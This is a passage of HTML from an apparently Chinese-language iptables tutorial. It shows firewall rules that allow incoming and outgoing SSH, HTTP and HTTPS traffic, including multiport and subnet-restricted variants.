SSH</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b21c976cb6483990291\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n#iptables -A INPUT -i eth0 -p tcp -s 192.168.200.0/24 --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT\r\n#iptables -A OUTPUT -o eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b21c976cb6483990291-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b21c976cb6483990291-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b21c976cb6483990291-1\"><span class=\"crayon-p\">#iptables -A INPUT -i eth0 -p tcp -s 192.168.200.0/24 --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b21c976cb6483990291-2\"><span class=\"crayon-p\">#iptables -A OUTPUT -o eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<h3># 6. 允许进来的（incoming）HTTP</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b21c976cba819563732\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\niptables -A INPUT -i eth0 -p tcp --dport 80 -m state --state NEW,ESTABLISHED -j ACCEPT\r\niptables -A OUTPUT -o eth0 -p tcp --sport 80 -m state --state ESTABLISHED -j ACCEPT</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b21c976cba819563732-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b21c976cba819563732-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b21c976cba819563732-1\"><span class=\"crayon-v\">iptables</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">A</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">INPUT</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">eth0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tcp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-i\">dport</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">80</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">m</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">state</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-e\">state </span><span class=\"crayon-r\">NEW</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">ESTABLISHED</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ACCEPT</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b21c976cba819563732-2\"><span class=\"crayon-v\">iptables</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">A</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">OUTPUT</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">o</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">eth0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tcp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-i\">sport</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">80</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">m</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">state</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-e\">state </span><span class=\"crayon-v\">ESTABLISHED</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ACCEPT</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0016 seconds] -->\r\n<p></p>\n<h3># 7. 多端口（允许进来的 SSH、HTTP 和 HTTPS）</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b21c976cbd333834789\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\niptables -A INPUT -i eth0 -p tcp -m multiport --dports 22,80,443 -m state --state NEW,ESTABLISHED -j ACCEPT\r\niptables -A OUTPUT -o eth0 -p tcp -m multiport --sports 22,80,443 -m state --state ESTABLISHED -j ACCEPT</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b21c976cbd333834789-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b21c976cbd333834789-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b21c976cbd333834789-1\"><span class=\"crayon-v\">iptables</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">A</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">INPUT</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">eth0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tcp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">m</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">multiport</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-i\">dports</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">22</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">80</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">443</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">m</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">state</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-e\">state </span><span class=\"crayon-r\">NEW</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">ESTABLISHED</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ACCEPT</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b21c976cbd333834789-2\"><span class=\"crayon-v\">iptables</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">A</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">OUTPUT</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">o</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">eth0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tcp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">m</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">multiport</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-i\">sports</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">22</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">80</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">443</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">m</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">state</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-e\">state </span><span class=\"crayon-v\">ESTABLISHED</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ACCEPT</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0020 seconds] -->\r\n<p></p>\n<h3># 8. 允许出去的（outgoing）SSH</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b21c976cc0570255203\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\niptables -A OUTPUT -o eth0 -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT\r\niptables -A INPUT -i eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b21c976cc0570255203-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b21c976cc0570255203-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b21c976cc0570255203-1\"><span class=\"crayon-v\">iptables</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">A</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">OUTPUT</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">o</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">eth0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tcp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-i\">dport</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">22</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">m</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">state</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-e\">state </span><span class=\"crayon-r\">NEW</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">ESTABLISHED</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ACCEPT</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b21c976cc0570255203-2\"><span class=\"crayon-v\">iptables</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">A</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">INPUT</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">eth0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tcp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-i\">sport</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">22</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">m</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">state</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-e\">state </span><span class=\"crayon-v\">ESTABLISHED</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ACCEPT</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0016 seconds] -->\r\n<p></p>\n<h3># 9. 允许外出的（outgoing）SSH，但仅访问某个特定的网络</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b21c976cc3764790449\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n#iptables -A OUTPUT -o eth0 -p tcp -d 192.168.101.0/24 --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT\r\n#iptables -A INPUT -i eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b21c976cc3764790449-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b21c976cc3764790449-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b21c976cc3764790449-1\"><span class=\"crayon-p\">#iptables -A OUTPUT -o eth0 -p tcp -d 192.168.101.0/24 --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b21c976cc3764790449-2\"><span class=\"crayon-p\">#iptables -A INPUT -i eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p></p>\n<h3># 10. 允许外出的（outgoing） HTTPS</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b21c976cc6462639877\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\niptables -A OUTPUT -o eth0 -p tcp --dport 443 -m state --state NEW,ESTABLISHED -j ACCEPT\r\niptables -A INPUT -i eth0 -p tcp --sport 443 -m state --state ESTABLISHED -j ACCEPT</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b21c976cc6462639877-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b21c976cc6462639877-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b21c976cc6462639877-1\"><span class=\"crayon-v\">iptables</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">A</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">OUTPUT</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">o</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">eth0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tcp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-i\">dport</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">443</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">m</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">state</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-e\">state </span><span class=\"crayon-r\">NEW</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">ESTABLISHED</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ACCEPT</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b21c976cc6462639877-2\"><span class=\"crayon-v\">iptables</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">A</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">INPUT</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">eth0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tcp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-i\">sport</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">443</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">m</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">state</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-e\">state </span><span class=\"crayon-v\">ESTABLISHED</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ACCEPT</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0016 seconds] -->\r\n<p></p>\n<h3># 11. 对进来的 HTTPS 流量做负载均衡</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div 